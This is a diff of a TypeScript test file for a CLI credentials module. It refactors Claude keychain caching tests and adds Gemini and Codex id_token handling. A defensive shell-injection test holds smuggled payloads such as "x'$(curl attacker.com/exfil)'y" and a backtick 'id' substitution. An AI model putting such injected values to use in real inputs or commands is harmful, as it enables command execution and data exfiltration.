@@ -8,11 +8,11 @@ const execFileSyncMock = vi.fn();
 const CLI_CREDENTIALS_CACHE_TTL_MS = 15 * 60 * 1000;
 let readClaudeCliCredentialsCached: typeof import("./cli-credentials.js").readClaudeCliCredentialsCached;
 let readCodexCliCredentialsCached: typeof import("./cli-credentials.js").readCodexCliCredentialsCached;
-let readQwenCliCredentialsCached: typeof import("./cli-credentials.js").readQwenCliCredentialsCached;
 let resetCliCredentialCachesForTest: typeof import("./cli-credentials.js").resetCliCredentialCachesForTest;
 let writeClaudeCliKeychainCredentials: typeof import("./cli-credentials.js").writeClaudeCliKeychainCredentials;
 let writeClaudeCliCredentials: typeof import("./cli-credentials.js").writeClaudeCliCredentials;
 let readCodexCliCredentials: typeof import("./cli-credentials.js").readCodexCliCredentials;
+let readGeminiCliCredentialsCached: typeof import("./cli-credentials.js").readGeminiCliCredentialsCached;
 
 function mockExistingClaudeKeychainItem() {
   execFileSyncMock.mockImplementation((file: unknown, args: unknown) => {
@@ -54,19 +54,15 @@ function createJwtWithExp(expSeconds: number): string {
   return `${encode({ alg: "RS256", typ: "JWT" })}.${encode({ exp: expSeconds })}.signature`;
 }
 
-function writePortalCliCredentialFile(
-  filePath: string,
-  options: { access: string; refresh: string; expires: number },
-) {
-  fs.mkdirSync(path.dirname(filePath), { recursive: true, mode: 0o700 });
-  fs.writeFileSync(
-    filePath,
+function mockClaudeCliCredentialRead() {
+  execSyncMock.mockImplementation(() =>
     JSON.stringify({
-      access_token: options.access,
-      refresh_token: options.refresh,
-      expiry_date: options.expires,
+      claudeAiOauth: {
+        accessToken: `token-${Date.now()}`,
+        refreshToken: "cached-refresh",
+        expiresAt: Date.now() + 60_000,
+      },
     }),
-    "utf8",
   );
 }
 
@@ -75,11 +71,11 @@ describe("cli credentials", () => {
     ({
       readClaudeCliCredentialsCached,
       readCodexCliCredentialsCached,
-      readQwenCliCredentialsCached,
       resetCliCredentialCachesForTest,
       writeClaudeCliKeychainCredentials,
       writeClaudeCliCredentials,
       readCodexCliCredentials,
+      readGeminiCliCredentialsCached,
     } = await import("./cli-credentials.js"));
   });
 
@@ -116,28 +112,27 @@ describe("cli credentials", () => {
     expect((addCall?.[1] as string[] | undefined) ?? []).toContain("-U");
   });
 
-  it("prevents shell injection via untrusted token payload values", async () => {
-    const cases = [
-      {
-        access: "x'$(curl attacker.com/exfil)'y",
-        refresh: "safe-refresh",
-        expectedPayload: "x'$(curl attacker.com/exfil)'y",
-      },
-      {
-        access: "safe-access",
-        refresh: "token`id`value",
-        expectedPayload: "token`id`value",
-      },
-    ] as const;
-
-    for (const testCase of cases) {
+  it.each([
+    {
+      access: "x'$(curl attacker.com/exfil)'y",
+      refresh: "safe-refresh",
+      expectedPayload: "x'$(curl attacker.com/exfil)'y",
+    },
+    {
+      access: "safe-access",
+      refresh: "token`id`value",
+      expectedPayload: "token`id`value",
+    },
+  ] as const)(
+    "prevents shell injection via untrusted token payload value $expectedPayload",
+    async ({ access, refresh, expectedPayload }) => {
       execFileSyncMock.mockClear();
       mockExistingClaudeKeychainItem();
 
       const ok = writeClaudeCliKeychainCredentials(
         {
-          access: testCase.access,
-          refresh: testCase.refresh,
+          access,
+          refresh,
           expires: Date.now() + 60_000,
         },
         { execFileSync: execFileSyncMock },
@@ -150,10 +145,10 @@ describe("cli credentials", () => {
       const args = (addCall?.[1] as string[] | undefined) ?? [];
       const wIndex = args.indexOf("-w");
       const passwordValue = args[wIndex + 1];
-      expect(passwordValue).toContain(testCase.expectedPayload);
+      expect(passwordValue).toContain(expectedPayload);
       expect(addCall?.[0]).toBe("security");
-    }
-  });
+    },
+  );
 
   it("falls back to the file store when the keychain update fails", async () => {
     const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), "openclaw-"));
@@ -207,50 +202,43 @@ describe("cli credentials", () => {
     expect(updated.claudeAiOauth?.expiresAt).toBeTypeOf("number");
   });
 
-  it("caches Claude Code CLI credentials within the TTL window", async () => {
-    execSyncMock.mockImplementation(() =>
-      JSON.stringify({
-        claudeAiOauth: {
-          accessToken: "cached-access",
-          refreshToken: "cached-refresh",
-          expiresAt: Date.now() + 60_000,
-        },
-      }),
-    );
+  it.each([
+    {
+      name: "caches Claude Code CLI credentials within the TTL window",
+      allowKeychainPromptSecondRead: false,
+      advanceMs: 0,
+      expectedCalls: 1,
+      expectSameObject: true,
+    },
+    {
+      name: "refreshes Claude Code CLI credentials after the TTL window",
+      allowKeychainPromptSecondRead: true,
+      advanceMs: CLI_CREDENTIALS_CACHE_TTL_MS + 1,
+      expectedCalls: 2,
+      expectSameObject: false,
+    },
+  ] as const)(
+    "$name",
+    async ({ allowKeychainPromptSecondRead, advanceMs, expectedCalls, expectSameObject }) => {
+      mockClaudeCliCredentialRead();
+      vi.setSystemTime(new Date("2025-01-01T00:00:00Z"));
 
-    vi.setSystemTime(new Date("2025-01-01T00:00:00Z"));
+      const first = await readCachedClaudeCliCredentials(true);
+      if (advanceMs > 0) {
+        vi.advanceTimersByTime(advanceMs);
+      }
+      const second = await readCachedClaudeCliCredentials(allowKeychainPromptSecondRead);
 
-    const first = await readCachedClaudeCliCredentials(true);
-    const second = await readCachedClaudeCliCredentials(false);
-
-    expect(first).toBeTruthy();
-    expect(second).toEqual(first);
-    expect(execSyncMock).toHaveBeenCalledTimes(1);
-  });
-
-  it("refreshes Claude Code CLI credentials after the TTL window", async () => {
-    execSyncMock.mockImplementation(() =>
-      JSON.stringify({
-        claudeAiOauth: {
-          accessToken: `token-${Date.now()}`,
-          refreshToken: "refresh",
-          expiresAt: Date.now() + 60_000,
-        },
-      }),
-    );
-
-    vi.setSystemTime(new Date("2025-01-01T00:00:00Z"));
-
-    const first = await readCachedClaudeCliCredentials(true);
-
-    vi.advanceTimersByTime(CLI_CREDENTIALS_CACHE_TTL_MS + 1);
-
-    const second = await readCachedClaudeCliCredentials(true);
-
-    expect(first).toBeTruthy();
-    expect(second).toBeTruthy();
-    expect(execSyncMock).toHaveBeenCalledTimes(2);
-  });
+      expect(first).toBeTruthy();
+      expect(second).toBeTruthy();
+      if (expectSameObject) {
+        expect(second).toEqual(first);
+      } else {
+        expect(second).not.toEqual(first);
+      }
+      expect(execSyncMock).toHaveBeenCalledTimes(expectedCalls);
+    },
+  );
 
   it("reads Codex credentials from keychain when available", async () => {
     const tempHome = fs.mkdtempSync(path.join(os.tmpdir(), "openclaw-codex-"));
@@ -265,6 +253,7 @@ describe("cli credentials", () => {
       expect(cmd).toContain(accountHash);
       return JSON.stringify({
         tokens: {
+          id_token: "keychain-id-token",
           access_token: createJwtWithExp(expSeconds),
           refresh_token: "keychain-refresh",
         },
@@ -279,6 +268,7 @@ describe("cli credentials", () => {
       refresh: "keychain-refresh",
       provider: "openai-codex",
       expires: expSeconds * 1000,
+      idToken: "keychain-id-token",
     });
   });
 
@@ -296,6 +286,7 @@ describe("cli credentials", () => {
       authPath,
       JSON.stringify({
         tokens: {
+          id_token: "file-id-token",
           access_token: createJwtWithExp(expSeconds),
           refresh_token: "file-refresh",
         },
@@ -310,6 +301,7 @@ describe("cli credentials", () => {
       refresh: "file-refresh",
       provider: "openai-codex",
       expires: expSeconds * 1000,
+      idToken: "file-id-token",
     });
   });
 
@@ -373,47 +365,66 @@ describe("cli credentials", () => {
     }
   });
 
-  it("invalidates cached Qwen credentials when oauth_creds.json changes within the TTL window", () => {
-    const tempHome = fs.mkdtempSync(path.join(os.tmpdir(), "openclaw-qwen-cache-"));
-    const credPath = path.join(tempHome, ".qwen", "oauth_creds.json");
+  it("lifts Google account identity from the Gemini id_token", () => {
+    const tempHome = fs.mkdtempSync(path.join(os.tmpdir(), "openclaw-gemini-"));
     try {
-      writePortalCliCredentialFile(credPath, {
-        access: "stale-access",
-        refresh: "stale-refresh",
-        expires: 1_000,
-      });
-      fs.utimesSync(credPath, new Date("2026-03-24T10:00:00Z"), new Date("2026-03-24T10:00:00Z"));
-      vi.setSystemTime(new Date("2026-03-24T10:00:00Z"));
+      const credPath = path.join(tempHome, ".gemini", "oauth_creds.json");
+      fs.mkdirSync(path.dirname(credPath), { recursive: true, mode: 0o700 });
+      const idTokenPayload = Buffer.from(
+        JSON.stringify({ sub: "google-account-42", email: "user@example.com" }),
+      ).toString("base64url");
+      const idToken = `header.${idTokenPayload}.signature`;
+      fs.writeFileSync(
+        credPath,
+        JSON.stringify({
+          access_token: "gemini-access",
+          refresh_token: "gemini-refresh",
+          id_token: idToken,
+          expiry_date: Date.parse("2026-04-25T12:00:00Z"),
+        }),
+        "utf8",
+      );
 
-      const first = readQwenCliCredentialsCached({
-        ttlMs: CLI_CREDENTIALS_CACHE_TTL_MS,
-        homeDir: tempHome,
-      });
+      const creds = readGeminiCliCredentialsCached({ homeDir: tempHome, ttlMs: 0 });
 
-      expect(first).toMatchObject({
-        access: "stale-access",
-        refresh: "stale-refresh",
-        expires: 1_000,
+      expect(creds).toMatchObject({
+        type: "oauth",
+        provider: "google-gemini-cli",
+        access: "gemini-access",
+        refresh: "gemini-refresh",
+        accountId: "google-account-42",
+        email: "user@example.com",
       });
+    } finally {
+      fs.rmSync(tempHome, { recursive: true, force: true });
+    }
+  });
 
-      writePortalCliCredentialFile(credPath, {
-        access: "fresh-access",
-        refresh: "fresh-refresh",
-        expires: 2_000,
-      });
-      fs.utimesSync(credPath, new Date("2026-03-24T10:05:00Z"), new Date("2026-03-24T10:05:00Z"));
-      vi.advanceTimersByTime(60_000);
+  it("reads Gemini credentials without identity fields when id_token is absent", () => {
+    const tempHome = fs.mkdtempSync(path.join(os.tmpdir(), "openclaw-gemini-noid-"));
+    try {
+      const credPath = path.join(tempHome, ".gemini", "oauth_creds.json");
+      fs.mkdirSync(path.dirname(credPath), { recursive: true, mode: 0o700 });
+      fs.writeFileSync(
+        credPath,
+        JSON.stringify({
+          access_token: "gemini-access",
+          refresh_token: "gemini-refresh",
+          expiry_date: Date.parse("2026-04-25T12:00:00Z"),
+        }),
+        "utf8",
+      );
 
-      const second = readQwenCliCredentialsCached({
-        ttlMs: CLI_CREDENTIALS_CACHE_TTL_MS,
-        homeDir: tempHome,
-      });
+      const creds = readGeminiCliCredentialsCached({ homeDir: tempHome, ttlMs: 0 });
 
-      expect(second).toMatchObject({
-        access: "fresh-access",
-        refresh: "fresh-refresh",
-        expires: 2_000,
+      expect(creds).toMatchObject({
+        type: "oauth",
+        provider: "google-gemini-cli",
+        access: "gemini-access",
+        refresh: "gemini-refresh",
       });
+      expect(creds?.accountId).toBeUndefined();
+      expect(creds?.email).toBeUndefined();
     } finally {
       fs.rmSync(tempHome, { recursive: true, force: true });
     }
